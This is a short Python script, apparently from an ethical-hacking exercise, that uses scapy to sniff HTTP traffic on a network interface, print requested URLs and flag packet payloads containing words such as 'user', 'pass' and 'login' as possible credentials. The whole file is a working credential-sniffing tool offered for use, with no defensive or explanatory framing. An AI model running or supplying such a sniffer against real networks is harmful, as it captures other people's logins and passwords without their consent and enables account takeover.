import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    

def process_sniffed_packet(packet: scapy.packet.Packet):
    # print(packet.show())
    if (packet.haslayer(http.HTTPRequest)):
        
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f'[+] HTTP Request >> {url}')

        if (packet.haslayer(scapy.Raw)):
            load = packet[scapy.Raw].load
            keywords = ['user', 'pass', 'username', 'password', 'login']
            for keyword in keywords:
                if keyword.encode() in load:
                    print(f"  [*] Possible cred: {load}")
                    break


if __name__ == "__main__":
    sniff('ens33')
